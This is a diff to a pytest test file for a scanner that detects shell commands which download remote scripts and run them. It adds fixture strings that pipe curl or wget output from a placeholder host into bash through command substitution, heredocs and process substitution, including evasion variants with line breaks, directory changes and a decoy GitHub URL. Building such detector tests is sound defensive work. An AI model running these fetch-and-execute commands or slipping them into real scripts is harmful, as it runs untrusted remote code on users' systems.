@@ -150,6 +150,10 @@ def test_real_or_unproved_pipeline_still_flags(command: str, documented: bool) -
         "source <(wget -qO- https://payload.example/env.sh)",
         "python3 <(curl -s https://payload.example/run.py)",
         'bash <<< "$(curl https://payload.example/install.sh)"',
+        'bash -c "$(\n  curl -fsSL https://payload.example/install.sh\n)"',
+        "bash <(\n  curl -s https://payload.example/install.sh\n)",
+        'bash -c "$(cd /tmp && curl -fsSL https://payload.example/install.sh)"',
+        'bash -c "$(curl -fsSL https://payload.example/install.sh; : https://github.com)"',
     ],
 )
 @pytest.mark.parametrize("documented", [False, True], ids=["source", "markdown-fence"])
@@ -169,6 +173,8 @@ def test_fetch_executed_through_substitution_flags(command: str, documented: boo
         'deploy.sh "$(curl https://payload.example/token)"',
         'bash "$(curl https://payload.example/path)"',
         "diff <(curl https://payload.example/a) b.txt",
+        "bash -c \"$(printf 'echo curl https://payload.example/status')\"",
+        'eval "$(echo curl https://payload.example/status)"',
     ],
 )
 def test_fetch_substitution_used_as_data_does_not_flag(command: str) -> None:
